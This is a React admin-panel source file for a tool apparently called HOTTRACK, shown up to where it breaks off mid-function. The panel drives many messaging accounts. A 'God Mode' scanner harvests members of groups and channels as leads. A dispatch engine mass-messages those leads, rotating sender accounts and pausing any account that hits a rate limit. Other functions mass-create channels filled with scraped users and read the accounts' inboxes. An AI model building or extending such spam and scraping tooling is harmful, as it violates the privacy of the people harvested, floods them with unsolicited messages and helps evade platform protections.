import { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  RocketLaunchIcon, UserGroupIcon, EyeIcon, InboxArrowDownIcon,
  TvIcon, WrenchScrewdriverIcon,
  PlayIcon, StopIcon, TrashIcon, ArrowPathIcon,
  ChatBubbleLeftRightIcon, LockClosedIcon, ChartBarIcon, DocumentDuplicateIcon,
  CheckCircleIcon, XCircleIcon, PaperAirplaneIcon, PlusCircleIcon, DocumentCheckIcon,
  DocumentPlusIcon
} from '@heroicons/react/24/outline';

// --- COMPONENTES DE UI REUTILIZÁVEIS (DESIGN SYSTEM FINTECH) ---
const Card = ({ children, style }) => (
    <div style={{ background: '#0A0A0A', padding: '24px', borderRadius: '8px', border: '1px solid #1F1F1F', ...style }}>
        {children}
    </div>
);

const Input = (props) => (
    <input 
        {...props} 
        style={{ 
            width: '100%', padding: '12px 16px', background: '#000000', color: '#EDEDED', 
            border: '1px solid #1F1F1F', borderRadius: '6px', fontSize: '13px', 
            outline: 'none', transition: 'border 0.2s', ...props.style 
        }} 
        onFocus={(e) => e.target.style.border = '1px solid #444'}
        onBlur={(e) => e.target.style.border = '1px solid #1F1F1F'}
    />
);

const Select = (props) => (
    <select
        {...props}
        style={{
            width: '100%', padding: '12px 16px', background: '#000000', color: '#EDEDED', 
            border: '1px solid #1F1F1F', borderRadius: '6px', fontSize: '13px', 
            outline: 'none', transition: 'border 0.2s', ...props.style
        }}
    >
        {props.children}
    </select>
);

const Button = ({ children, variant = 'primary', icon: Icon, loading, ...props }) => {
    const baseStyle = {
        padding: '12px 20px', borderRadius: '6px', fontSize: '13px', fontWeight: '500',
        display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
        cursor: props.disabled ? 'not-allowed' : 'pointer', border: 'none', transition: 'all 0.2s'
    };
    
    const variants = {
        primary: { background: '#EDEDED', color: '#000000' },
        secondary: { background: '#141414', color: '#EDEDED', border: '1px solid #1F1F1F' },
        danger: { background: '#1A0505', color: '#FF453A', border: '1px solid #3A1010' },
        success: { background: '#051A0A', color: '#32D74B', border: '1px solid #0A3A15' },
    };

    return (
        <motion.button 
            whileHover={!props.disabled ? { scale: 1.01 } : {}}
            whileTap={!props.disabled ? { scale: 0.98 } : {}}
            style={{ ...baseStyle, ...variants[variant], opacity: props.disabled ? 0.6 : 1, ...props.style }}
            {...props}
        >
            {loading ? <ArrowPathIcon style={{ width: 16, height: 16 }} className="animate-spin" /> : Icon && <Icon style={{ width: 16, height: 16 }} />}
            {children}
        </motion.button>
    );
};

const NAV_ITEMS = [
    { id: 'dashboard', label: 'CRM', icon: RocketLaunchIcon },
    { id: 'groups', label: 'Grupos', icon: UserGroupIcon },
    { id: 'spy', label: 'Scanner', icon: EyeIcon },
    { id: 'inbox', label: 'Inbox', icon: InboxArrowDownIcon },
    { id: 'channels', label: 'Canais', icon: TvIcon },
    { id: 'tools', label: 'Ferramentas', icon: WrenchScrewdriverIcon }
];

const Sidebar = ({ tab, setTab, isAdmin, onLogout }) => (
    <div style={{
        position: 'fixed', top: 0, left: 0, width: '240px', height: '100vh',
        background: '#050505', borderRight: '1px solid #1F1F1F',
        display: 'flex', flexDirection: 'column', padding: '24px 16px', zIndex: 10
    }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px', padding: '0 8px', marginBottom: '32px' }}>
            <motion.div
                animate={{ rotate: [0, 8, -8, 0] }}
                transition={{ duration: 4, repeat: Infinity, ease: 'easeInOut' }}
                style={{ width: '28px', height: '28px', borderRadius: '8px', background: 'linear-gradient(135deg, #EDEDED, #8B949E)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}
            >
                <RocketLaunchIcon style={{ width: 16, height: 16, color: '#000' }} />
            </motion.div>
            <div>
                <div style={{ fontSize: '14px', fontWeight: 600, color: '#FFF', letterSpacing: '-0.3px' }}>HOTTRACK</div>
                <div style={{ fontSize: '11px', color: '#8B949E' }}>Workspace</div>
            </div>
        </div>

        <div style={{ display: 'flex', flexDirection: 'column', gap: '4px', flex: 1, overflowY: 'auto' }}>
            {NAV_ITEMS.map(item => {
                const active = tab === item.id;
                return (
                    <motion.button
                        key={item.id}
                        onClick={() => setTab(item.id)}
                        whileHover={!active ? { x: 2 } : {}}
                        whileTap={{ scale: 0.98 }}
                        style={{
                            position: 'relative', display: 'flex', alignItems: 'center', gap: '12px',
                            padding: '10px 12px', borderRadius: '8px', border: 'none', background: 'transparent',
                            cursor: 'pointer', width: '100%', textAlign: 'left',
                            color: active ? '#FFF' : '#8B949E', fontSize: '13px', fontWeight: '500'
                        }}
                    >
                        {active && (
                            <motion.div
                                layoutId="sidebar-active-pill"
                                transition={{ type: 'spring', stiffness: 500, damping: 40 }}
                                style={{ position: 'absolute', inset: 0, background: '#141414', border: '1px solid #1F1F1F', borderRadius: '8px' }}
                            />
                        )}
                        <motion.div
                            style={{ position: 'relative', zIndex: 1, display: 'flex' }}
                            animate={active ? { scale: 1.1 } : { scale: 1 }}
                            whileHover={{ scale: 1.15, rotate: -6 }}
                            transition={{ type: 'spring', stiffness: 400, damping: 15 }}
                        >
                            <item.icon style={{ width: 18, height: 18 }} />
                        </motion.div>
                        <span style={{ position: 'relative', zIndex: 1 }}>{item.label}</span>
                    </motion.button>
                );
            })}
        </div>

        <div style={{ borderTop: '1px solid #1F1F1F', paddingTop: '16px', display: 'flex', flexDirection: 'column', gap: '10px', fontSize: '12px', color: '#8B949E' }}>
            {isAdmin && (
                <div style={{ display: 'flex', alignItems: 'center', gap: '6px', color: '#EDEDED' }}>
                    <LockClosedIcon style={{ width: 12 }} /> ADMIN
                </div>
            )}
            <div>v6.0.5</div>
            <motion.button
                onClick={onLogout}
                whileHover={{ x: 2 }}
                style={{ background: 'none', border: 'none', padding: 0, color: '#FF453A', cursor: 'pointer', fontSize: '12px', textAlign: 'left' }}
            >
                Encerrar sessão
            </motion.button>
        </div>
    </div>
);

export default function AdminPanel() {
  // --- ESTADOS DE AUTENTICAÇÃO ---
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [loginMode, setLoginMode] = useState('user');
  const [usernameInput, setUsernameInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  const [adminTokenInput, setAdminTokenInput] = useState('');
  const [authToken, setAuthToken] = useState('');
  const [isAdmin, setIsAdmin] = useState(false);

  // --- CONFIG DO USUÁRIO ---
  const [myRedirectUrl, setMyRedirectUrl] = useState('');
  const [savingRedirect, setSavingRedirect] = useState(false);

  // --- GESTÃO DE USERS (ADMIN) ---
  const [newUserUsername, setNewUserUsername] = useState('');
  const [newUserPassword, setNewUserPassword] = useState('');
  const [newUserRedirectUrl, setNewUserRedirectUrl] = useState('');
  const [creatingUser, setCreatingUser] = useState(false);
  const [createdUser, setCreatedUser] = useState(null);
  const [usersList, setUsersList] = useState([]);
  
  // --- NAVEGAÇÃO ---
  const [tab, setTab] = useState('dashboard'); 
  
  // --- DADOS DO SISTEMA ---
  const [sessions, setSessions] = useState([]);
  const [stats, setStats] = useState({ total: 0, pending: 0, sent: 0 });
  const [logs, setLogs] = useState([]);
  
  // --- ESTADOS DO CRM ---
  const [processing, setProcessing] = useState(false);
  const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');
  const [imgUrl, setImgUrl] = useState(''); 
  const [selectedPhones, setSelectedPhones] = useState(new Set());
  const [progress, setProgress] = useState(0);
  const [checkingStatus, setCheckingStatus] = useState(false);
  const stopCampaignRef = useRef(false);

  // --- ESTADOS DO GOD MODE ---
  const [allGroups, setAllGroups] = useState([]);
  const [allChannels, setAllChannels] = useState([]);
  const [harvestedIds, setHarvestedIds] = useState(new Set());
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [filterNumber, setFilterNumber] = useState('');
  const [isHarvestingAll, setIsHarvestingAll] = useState(false);
  const [totalHarvestedSession, setTotalHarvestedSession] = useState(0);
  const stopHarvestRef = useRef(false);

  // --- ESTADOS DE FERRAMENTAS ---
  const [viewingChat, setViewingChat] = useState(null);
  const [chatHistory, setChatHistory] = useState([]);
  const [loadingHistory, setLoadingHistory] = useState(false);
  const [newName, setNewName] = useState('');
  const [photoUrl, setPhotoUrl] = useState('');
  const [storyUrl, setStoryUrl] = useState('');
  const [storyCaption, setStoryCaption] = useState('');

  // --- ESTADOS DE CANAIS ---
  const [channels, setChannels] = useState([]);
  const [selectedChannel, setSelectedChannel] = useState(null);
  const [creatingChannel, setCreatingChannel] = useState(false);
  const [addingMembers, setAddingMembers] = useState(false);
  const [broadcastingChannel, setBroadcastingChannel] = useState(false);
  const [channelName, setChannelName] = useState('');
  const [channelDescription, setChannelDescription] = useState('');
  const [channelMessage, setChannelMessage] = useState('');
  const [channelMediaUrl, setChannelMediaUrl] = useState('');
  const [selectedChannelPhones, setSelectedChannelPhones] = useState(new Set());
  const [selectedChannelsForBroadcast, setSelectedChannelsForBroadcast] = useState(new Set());
  
  // --- ESTADOS DE CRIAÇÃO MASSIVA ---
  const [massCreating, setMassCreating] = useState(false);
  const [massChannelPrefix, setMassChannelPrefix] = useState('');
  const [massChannelDescription, setMassChannelDescription] = useState('');
  const [leadsPerChannel, setLeadsPerChannel] = useState(100);
  const [startNumber, setStartNumber] = useState(1);
  const [batchSize, setBatchSize] = useState(5);
  const [delayBetweenChannels, setDelayBetweenChannels] = useState(10);

  // --- ESTADOS DO INBOX VIEWER ---
  const [inboxDialogs, setInboxDialogs] = useState([]);
  const [selectedInboxPhone, setSelectedInboxPhone] = useState('');
  const [selectedDialog, setSelectedDialog] = useState(null);
  const [inboxHistory, setInboxHistory] = useState([]);
  const [loadingInboxHistory, setLoadingInboxHistory] = useState(false);
  const [loadingInbox, setLoadingInbox] = useState(false);
  const [loadingBotFlow, setLoadingBotFlow] = useState(false);

  // --- ESTADOS DE GRUPOS ---
  const [createdGroups, setCreatedGroups] = useState([]);
  const [groupCreationProgress, setGroupCreationProgress] = useState(0);
  const [isCreatingGroups, setIsCreatingGroups] = useState(false);
  const [groupMessage, setGroupMessage] = useState('');
  const [groupMediaUrl, setGroupMediaUrl] = useState('');
  const [selectedGroupsForBroadcast, setSelectedGroupsForBroadcast] = useState(new Set());
  const [broadcastProgress, setBroadcastProgress] = useState(0);
  const [isBroadcasting, setIsBroadcasting] = useState(false);
  const stopBroadcastRef = useRef(false);
  const [groupNameTemplate, setGroupNameTemplate] = useState('VIP Club {number}');
  const [groupPhotoUrl, setGroupPhotoUrl] = useState('');

  // --- INICIALIZAÇÃO ---
  useEffect(() => {
    const savedToken = localStorage.getItem('authToken');
    if (savedToken) {
      setAuthToken(savedToken);
      setIsAuthenticated(true);
      try {
        const payload = JSON.parse(atob(savedToken.split('.')[1]));
        setIsAdmin(payload.isAdmin === true || payload.type === 'admin');
      } catch (e) {
        setIsAdmin(false);
      }
    }
    const savedGroups = localStorage.getItem('godModeGroups');
    const savedChannels = localStorage.getItem('godModeChannels');
    if (savedGroups) setAllGroups(JSON.parse(savedGroups));
    if (savedChannels) setAllChannels(JSON.parse(savedChannels));
  }, []);

  useEffect(() => {
    if (isAuthenticated && authToken) {
        fetchData();
        loadScannedChatsFromServer();
        loadCreatedGroupsFromServer();
    }
  }, [isAuthenticated, authToken]);

  useEffect(() => {
    if (!isAuthenticated || !authToken) return;
    const run = async () => {
      if (!isAdmin) {
        try {
          const res = await authenticatedFetch('/api/user/update-redirect', { method: 'GET' });
          const data = await res.json();
          if (res.ok && data?.success) setMyRedirectUrl(data.redirect_url || '');
        } catch (e) {}
      }
      if (isAdmin) {
        try {
          const res = await authenticatedFetch('/api/admin/list-users', { method: 'GET' });
          const data = await res.json();
          if (res.ok && data?.success) setUsersList(data.users || []);
        } catch (e) {}
      }
    };
    run();
  }, [isAuthenticated, authToken, isAdmin]);

  useEffect(() => {
    if (isAuthenticated) loadChannels();
  }, [isAuthenticated]);

  const authenticatedFetch = async (url, options = {}) => {
    const headers = {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${authToken}`,
      ...options.headers
    };
    return fetch(url, { ...options, headers });
  };

  const loadScannedChatsFromServer = async () => {
    try {
      const res = await authenticatedFetch('/api/spy/get-scanned-chats');
      if (!res.ok) return;
      const data = await res.json();
      if (data.success && (data.groups.length > 0 || data.channels.length > 0)) {
        const localGroups = JSON.parse(localStorage.getItem('godModeGroups') || '[]');
        const localChannels = JSON.parse(localStorage.getItem('godModeChannels') || '[]');
        const serverGroupsMap = new Map(data.groups.map(g => [g.id, g]));
        const serverChannelsMap = new Map(data.channels.map(c => [c.id, c]));
        
        for (const localGroup of localGroups) {
          if (!serverGroupsMap.has(localGroup.id)) serverGroupsMap.set(localGroup.id, localGroup);
        }
        for (const localChannel of localChannels) {
          if (!serverChannelsMap.has(localChannel.id)) serverChannelsMap.set(localChannel.id, localChannel);
        }
        
        const mergedGroups = Array.from(serverGroupsMap.values()).sort((a, b) => (b.participantsCount || 0) - (a.participantsCount || 0));
        const mergedChannels = Array.from(serverChannelsMap.values()).sort((a, b) => (b.participantsCount || 0) - (a.participantsCount || 0));
        
        setAllGroups(mergedGroups);
        setAllChannels(mergedChannels);
        localStorage.setItem('godModeGroups', JSON.stringify(mergedGroups));
        localStorage.setItem('godModeChannels', JSON.stringify(mergedChannels));
      }
    } catch (error) {}
  };

  const loadCreatedGroupsFromServer = async () => {
    try {
      const res = await authenticatedFetch('/api/get-created-groups');
      if (!res.ok) return;
      const data = await res.json();
      if (data.success && Array.isArray(data.groups)) setCreatedGroups(data.groups);
    } catch (e) {}
  };

  const fetchData = async () => {
    try {
      const sRes = await authenticatedFetch('/api/list-sessions');
      const sData = await sRes.json();
      setSessions(prev => {
          const newSessions = sData.sessions || [];
          return newSessions.map(ns => {
              const old = prev.find(p => p.phone_number === ns.phone_number);
              return { ...ns, is_active: old ? old.is_active : ns.is_active };
          });
      });
      
      const stRes = await authenticatedFetch('/api/stats');
      if (stRes.ok) {
          const statsData = await stRes.json();
          setStats(statsData);
      }
      
      const hRes = await authenticatedFetch('/api/get-harvested');
      const hData = await hRes.json();
      if(hData.harvestedIds) setHarvestedIds(new Set(hData.harvestedIds));
    } catch (e) {
      addLog(`[ERRO] Falha ao carregar dados: ${e.message}`);
    }
  };

  const addLog = (text) => {
      setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);
  };

  // --- AUTENTICAÇÃO ---
  const handleUserLogin = async (e) => {
    e.preventDefault();
    if (!usernameInput || !passwordInput) return alert('Credenciais inválidas');
    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ username: usernameInput, password: passwordInput })
      });
      const data = await res.json();
      if(data.success) { 
          setAuthToken(data.token); setIsAdmin(false); setIsAuthenticated(true);
          localStorage.setItem('authToken', data.token);
          setUsernameInput(''); setPasswordInput('');
      } else alert(data.error || 'Credenciais inválidas');
    } catch (e) { alert('Erro de conexão'); }
  };

  const handleAdminTokenLogin = async (e) => {
    e.preventDefault();
    if (!adminTokenInput) return alert('Informe a senha');
    try {
      const res = await fetch('/api/admin-login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ password: adminTokenInput })
      });
      const data = await res.json();
      if(data.success) { 
          setAuthToken(data.token); setIsAdmin(true); setIsAuthenticated(true);
          localStorage.setItem('authToken', data.token); setAdminTokenInput('');
      } else alert(data.error || 'Senha incorreta');
    } catch (e) { alert('Erro de conexão'); }
  };

  const handleLogout = () => {
    setIsAuthenticated(false); setAuthToken(''); setIsAdmin(false); setCreatedUser(null);
    localStorage.removeItem('authToken');
  };

  const handleSaveRedirectUrl = async () => {
    setSavingRedirect(true);
    try {
      const res = await authenticatedFetch('/api/user/update-redirect', {
        method: 'POST', body: JSON.stringify({ redirectUrl: myRedirectUrl })
      });
      const data = await res.json();
      if (res.ok && data?.success) {
        setMyRedirectUrl(data.redirect_url || '');
        addLog('[SUCESSO] Redirect atualizado.');
      } else alert(data?.error || 'Falha ao salvar redirect.');
    } catch (e) { alert('Erro de conexão'); }
    setSavingRedirect(false);
  };

  const handleCreateUser = async () => {
    if (!newUserUsername || !newUserPassword) return alert('Informe credenciais.');
    setCreatingUser(true); setCreatedUser(null);
    try {
      const res = await authenticatedFetch('/api/admin/create-user', {
        method: 'POST', body: JSON.stringify({ username: newUserUsername, password: newUserPassword, redirectUrl: newUserRedirectUrl })
      });
      const data = await res.json();
      if (res.ok && data?.success && data?.user) {
        setCreatedUser(data.user); setNewUserUsername(''); setNewUserPassword(''); setNewUserRedirectUrl('');
        addLog(`[SUCESSO] Usuário criado: ${data.user.username}`);
        try {
          const lr = await authenticatedFetch('/api/admin/list-users', { method: 'GET' });
          const ld = await lr.json();
          if (lr.ok && ld?.success) setUsersList(ld.users || []);
        } catch (e) {}
      } else alert(data?.error || 'Falha ao criar usuário.');
    } catch (e) { alert('Erro de conexão'); }
    setCreatingUser(false);
  };

  const checkAllStatus = async () => {
      if(sessions.length === 0) return;
      setCheckingStatus(true);
      addLog('[SISTEMA] Verificando integridade das contas (Sequencial)...');
      let currentSessions = [...sessions];
      for(let i=0; i < currentSessions.length; i++) {
          try {
              const res = await authenticatedFetch('/api/check-status', {
                  method: 'POST', body: JSON.stringify({ phone: currentSessions[i].phone_number })
              });
              const data = await res.json();
              currentSessions[i].is_active = (data.status === 'alive');
              setSessions([...currentSessions]); 
          } catch(e) {}
      }
      setCheckingStatus(false);
      addLog('[SUCESSO] Verificação finalizada.');
  };

  const toggleSelect = (phone) => {
    const newSet = new Set(selectedPhones);
    newSet.has(phone) ? newSet.delete(phone) : newSet.add(phone);
    setSelectedPhones(newSet);
  };

  const selectAllActive = () => {
      const newSet = new Set();
      sessions.forEach(s => { if(s.is_active) newSet.add(s.phone_number) });
      setSelectedPhones(newSet);
      addLog(`[INFO] Selecionadas ${newSet.size} contas online.`);
  };

  const handleDeleteSession = async (phone) => {
      if(!confirm(`Remover permanentemente a conta ${phone}?`)) return;
      await authenticatedFetch('/api/delete-session', { method: 'POST', body: JSON.stringify({phone}) });
      setSessions(prev => prev.filter(s => s.phone_number !== phone));
  };

  // --- MOTOR V6 DISPARO ---
  const startRealCampaign = async () => {
     if (selectedPhones.size === 0) return alert('Selecione contas remetentes.');
     if(!confirm(`INICIAR DISPARO INTELIGENTE?\n\nLeads Pendentes: ${stats.pending}\nContas Ativas: ${selectedPhones.size}`)) return;

     setProcessing(true);
     stopCampaignRef.current = false;
     setProgress(0);
     addLog('[SISTEMA] Motor V6 Iniciado (Estratégia Híbrida)...');
     
     try {
         let availableSenders = Array.from(selectedPhones);
         const floodCoolDown = new Map(); 
         const BATCH_SIZE = 12; 
         const DELAY_BETWEEN_BATCHES = 3500; 
         const LEADS_PER_FETCH = 200; 
         let totalSentCount = 0;

         while (true) {
             if (stopCampaignRef.current) {
                 addLog('[AVISO] Disparo interrompido manualmente.');
                 break;
             }
             const now = Date.now();
             for (const [phone, unlockTime] of floodCoolDown.entries()) {
                 if (now > unlockTime) {
                     availableSenders.push(phone);
                     floodCoolDown.delete(phone);
                     addLog(`[INFO] Conta ${phone} saiu do cooldown.`);
                 }
             }

             if (availableSenders.length === 0) {
                 addLog('[AVISO] Contas em cooldown. Aguardando 1 min...');
                 await new Promise(r => setTimeout(r, 60000));
                 continue;
             }

             const res = await authenticatedFetch(`/api/get-campaign-leads?limit=${LEADS_PER_FETCH}`);
             const data = await res.json();
             const leads = data.leads || [];
             
             if (leads.length === 0) {
                 addLog('[SUCESSO] Sem mais leads pendentes no banco.');
                 break; 
             }

             for (let i = 0; i < leads.length; i += BATCH_SIZE) {
                 if (stopCampaignRef.current) break;
                 const batch = leads.slice(i, i + BATCH_SIZE);
                 
                 const promises = batch.map((lead, index) => {
                     if (availableSenders.length === 0) return null;
                     const senderIndex = (totalSentCount + index) % availableSenders.length;
                     const sender = availableSenders[senderIndex];
                     
                     return authenticatedFetch('/api/dispatch', {
                         method: 'POST',
                         body: JSON.stringify({
                             senderPhone: sender, target: lead.user_id, username: lead.username,
                             originChatId: lead.chat_id, message: msg, imageUrl: imgUrl, leadDbId: lead.id
                         })
                     }).then(async (response) => {
                         const d = await response.json();
                         if (response.status === 429) {
                             addLog(`[AVISO] ${sender} com Rate Limit. Pausa de 5 min.`);
                             availableSenders = availableSenders.filter(p => p !== sender);
                             floodCoolDown.set(sender, Date.now() + 300000);
                         }
                         return d;
                     }).catch(err => {});
                 });

                 await Promise.all(promises);
                 totalSentCount += batch.length;
                 setProgress(stats.pending ? Math.round((totalSentCount / stats.pending) * 100) : 100);
                 await new Promise(r => setTimeout(r, DELAY_BETWEEN_BATCHES));
             }
             if (leads.length < LEADS_PER_FETCH) break;
         }
         addLog(`[SUCESSO] Disparo concluído. Total: ${totalSentCount}`);
         fetchData(); 
     } catch (e) { 
         addLog(`[FALHA] Erro Crítico no Motor: ${e.message}`); 
     }
     setProcessing(false);
  };

  const stopCampaign = () => {
      stopCampaignRef.current = true;
      addLog('[AVISO] Solicitando parada imediata do disparo...');
  };

  // --- CANAIS MASSIVOS V2 E V3 ---
  const massCreateChannelsV3 = async () => {
    if (!massChannelPrefix.trim()) return addLog('[ERRO] Prefixo obrigatório');
    const phonesToUse = Array.from(selectedChannelPhones);
    if (phonesToUse.length === 0) return addLog('[ERRO] Selecione números');
    
    setMassCreating(true);
    addLog(`[SISTEMA] Iniciando criação massiva (V3): "${massChannelPrefix}"`);
    try {
      const res = await authenticatedFetch('/api/spy/mass-create-channels-v4', {
        method: 'POST', body: JSON.stringify({
          channelPrefix: massChannelPrefix.trim(), channelDescription: massChannelDescription.trim(),
          leadsPerChannel: parseInt(leadsPerChannel), selectedPhones: phonesToUse, startNumber: parseInt(startNumber),
          batchSize: parseInt(batchSize), delayBetweenChannels: parseInt(delayBetweenChannels), useLeadsWithUsername: true
        })
      });
      const data = await res.json();
      if (data.success) {
          addLog(`[SUCESSO] Criação concluída. Canais: ${data.summary.totalChannelsCreated}`);
          await loadChannels();
          setMassChannelPrefix(''); setMassChannelDescription(''); setSelectedChannelPhones(new Set());
      } else addLog(`[ERRO] ${data.error}`);
    } catch (e) { addLog(`[ERRO] ${e.message}`); }
    finally { setMassCreating(false); }
  };

  const massCreateChannelsV2 = async () => {
    if (!massChannelPrefix.trim()) return addLog('[ERRO] Prefixo obrigatório');
    const phonesToUse = Array.from(selectedChannelPhones);
    if (phonesToUse.length === 0) return addLog('[ERRO] Selecione números');
    
    setMassCreating(true);
    addLog(`[SISTEMA] Iniciando criação massiva (V2): "${massChannelPrefix}"`);
    try {
      const res = await authenticatedFetch('/api/spy/mass-create-channels-v2', {
        method: 'POST', body: JSON.stringify({
          channelPrefix: massChannelPrefix.trim(), channelDescription: massChannelDescription.trim(),
          leadsPerChannel: parseInt(leadsPerChannel), selectedPhones: phonesToUse, startNumber: parseInt(startNumber),
          batchSize: parseInt(batchSize), delayBetweenChannels: parseInt(delayBetweenChannels)
        })
      });
      const data = await res.json();
      if (data.success) {
          addLog(`[SUCESSO] Criação concluída. Canais: ${data.summary.totalChannelsCreated}`);
          await loadChannels();
          setMassChannelPrefix(''); setMassChannelDescription(''); setSelectedChannelPhones(new Set());
      } else addLog(`[ERRO] ${data.error}`);
    } catch (e) { addLog(`[ERRO] ${e.message}`); }
    finally { setMassCreating(false); }
  };

  const massBroadcastChannels = async () => {
    if (!channelMessage.trim()) return addLog('[ERRO] Mensagem obrigatória');
    const selectedChannelsList = Array.from(selectedChannelsForBroadcast);
    if (selectedChannelsList.length === 0) return addLog('[ERRO] Selecione canais');
    
    setBroadcastingChannel(true);
    addLog(`[SISTEMA] Iniciando broadcast para ${selectedChannelsList.length} canais`);
    try {
      const res = await authenticatedFetch('/api/spy/mass-broadcast-channels', {
        method: 'POST', body: JSON.stringify({ selectedChannels: selectedChannelsList, message: channelMessage.trim(), mediaUrl: channelMediaUrl.trim(), delayBetweenMessages: 3000 })
      });
      const data = await res.json();
      if (data.success) {
          addLog(`[SUCESSO] Broadcast concluído. Envios: ${data.summary.totalMessagesSent}`);
          setSelectedChannelsForBroadcast(new Set()); setChannelMessage(''); setChannelMediaUrl('');
      } else addLog(`[ERRO] ${data.error}`);
    } catch (e) { addLog(`[ERRO] ${e.message}`); }
    finally { setBroadcastingChannel(false); }
  };

  const createChannelSimple = async () => {
    if (!channelName.trim()) return addLog('[ERRO] Nome obrigatório');
    const phonesToUse = Array.from(selectedChannelPhones);
    if (phonesToUse.length === 0) return addLog('[ERRO] Selecione número');
    setCreatingChannel(true);
    addLog(`[SISTEMA] Criando canal "${channelName}"...`);
    try {
      const res = await authenticatedFetch('/api/spy/create-channel-simple', {
        method: 'POST', body: JSON.stringify({ phone: phonesToUse[0], channelName: channelName.trim(), channelDescription: channelDescription.trim(), selectedPhones: phonesToUse })
      });
      const data = await res.json();
      if (data.success) { addLog(`[SUCESSO] ${data.message}`); await loadChannels(); }
      else addLog(`[ERRO] ${data.error}`);
    } catch (e) { addLog(`[ERRO] ${e.message}`); }
    finally { setCreatingChannel(false); }
  };

  const loadChannels = async () => {
    try {
      const res = await authenticatedFetch('/api/spy/list-channels', { method: 'GET' });
      const data = await res.json();
      if (data.success) setChannels(data.channels);
    } catch (e) {}
  };

  const createChannel = async () => {
    if (!channelName.trim()) return addLog('[ERRO] Nome obrigatório');
    const selectedPhonesArray = Array.from(selectedChannelPhones);
    if (selectedPhonesArray.length === 0) return addLog('[ERRO] Selecione número');
    setCreatingChannel(true);
    try {
      const res = await authenticatedFetch('/api/spy/create-channel', {
        method: 'POST', body: JSON.stringify({ phone: selectedPhonesArray[0], channelName: channelName.trim(), channelDescription: channelDescription.trim(), selectedPhones: selectedPhonesArray })
      });
      const data = await res.json();
      if (data.success) { addLog(`[SUCESSO] Canal criado!`); loadChannels(); setSelectedChannel(data.channel); }
      else addLog(`[ERRO] ${data.error}`);
    } catch (e) { addLog(`[ERRO] ${e.message}`); }
    finally { setCreatingChannel(false); }
  };

  const addMembersToChannel = async () => {
    if (!selectedChannel) return addLog('[ERRO] Selecione canal');
    const phonesToAdd = Array.from(selectedChannelPhones);
    if (phonesToAdd.length === 0) return addLog('[ERRO] Selecione números');
    setAddingMembers(true);
    addLog(`[SISTEMA] Adicionando membros...`);
    try {
      const res = await authenticatedFetch('/api/spy/add-members-batch', {
        method: 'POST', body: JSON.stringify({ channelId: selectedChannel.channel_id, phonesToAdd: phonesToAdd, batchSize: 50, delayBetweenBatches: 5000 })
      });
      const data = await res.json();
      if (data.success) { addLog(`[SUCESSO] Membros adicionados. Total: ${data.summary.totalChannelMembers}`); loadChannels(); }
      else addLog(`[ERRO] ${data.error}`);
    } catch (e) { addLog(`[ERRO] ${e.message}`); }
    finally { setAddingMembers(false); }
  };

  const broadcastToChannel = async () => {
    if (!selectedChannel) return addLog('[ERRO] Selecione canal');
    if (!channelMessage.trim()) return addLog('[ERRO] Mensagem obrigatória');
    const senderPhones = Array.from(selectedChannelPhones);
    if (senderPhones.length === 0) return addLog('[ERRO] Selecione número remetente');
    setBroadcastingChannel(true);
    addLog(`[SISTEMA] Enviando mensagem no canal...`);
    try {
      const res = await authenticatedFetch('/api/spy/broadcast-channel', {
        method: 'POST', body: JSON.stringify({ channelId: selectedChannel.channel_id, message: channelMessage.trim(), mediaUrl: channelMediaUrl.trim(), senderPhones: senderPhones, delayBetweenMessages: 3000 })
      });
      const data = await res.json();
      if (data.success) { addLog(`[SUCESSO] Mensagem enviada. Envios: ${data.summary.successfulSends}`); setChannelMessage(''); setChannelMediaUrl(''); }
      else addLog(`[ERRO] ${data.error}`);
    } catch (e) { addLog(`[ERRO] ${e.message}`); }
    finally { setBroadcastingChannel(false); }
  };

  // --- GOD MODE (ESPIÃO) ---
  const scanNetwork = async () => {
      if (sessions.length === 0) return alert("Nenhuma conta selecionada.");
      setIsScanning(true); setScanProgress(0);
      let groupsFound = []; let channelsFound = [];

      for (let i = 0; i < sessions.length; i++) {
          const phone = sessions[i].phone_number;
          setScanProgress(Math.round(((i + 1) / sessions.length) * 100));
          try {
              const res = await authenticatedFetch('/api/spy/list-chats', { method: 'POST', body: JSON.stringify({ phone }) });
              const data = await res.json();
              if (data.chats) {
                  data.chats.forEach(c => {
                      const chatObj = { ...c, ownerPhone: phone };
                      if (c.type === 'Canal') channelsFound.push(chatObj); 
                      else groupsFound.push(chatObj);
                  });
              }
          } catch (e) {}
      }
      const uniqueGroups = [...new Map(groupsFound.map(item => [item.id, item])).values()].sort((a,b) => b.participantsCount - a.participantsCount);
      const uniqueChannels = [...new Map(channelsFound.map(item => [item.id, item])).values()].sort((a,b) => b.participantsCount - a.participantsCount);

      setAllGroups(uniqueGroups); setAllChannels(uniqueChannels);
      localStorage.setItem('godModeGroups', JSON.stringify(uniqueGroups));
      localStorage.setItem('godModeChannels', JSON.stringify(uniqueChannels));
      
      try {
        await authenticatedFetch('/api/spy/save-scanned-chats', { method: 'POST', body: JSON.stringify({ groups: uniqueGroups, channels: uniqueChannels }) });
      } catch (e) {}
      setIsScanning(false);
  };

  const startMassHarvest = async () => {
      const targets = [...allGroups, ...allChannels].filter(c => !harvestedIds.has(c.id));
      if (targets.length === 0) return alert("Nenhuma fonte nova para aspirar.");
      if (!confirm(`MODO ASPIRADOR: Coletar de ${targets.length} fontes?`)) return;

      setIsHarvestingAll(true); stopHarvestRef.current = false;
      let sessionCount = 0;
      addLog(`[SCANNER] Iniciando Aspiração em ${targets.length} chats...`);

      for (let i = 0; i < targets.length; i++) {
          if (stopHarvestRef.current) break;
          const target = targets[i];
          try {
              const res = await authenticatedFetch('/api/spy/harvest', { 
                  method: 'POST', body: JSON.stringify({ phone: target.ownerPhone, chatId: target.id, chatName: target.title, isChannel: target.type === 'Canal' })
              });
              const data = await res.json();
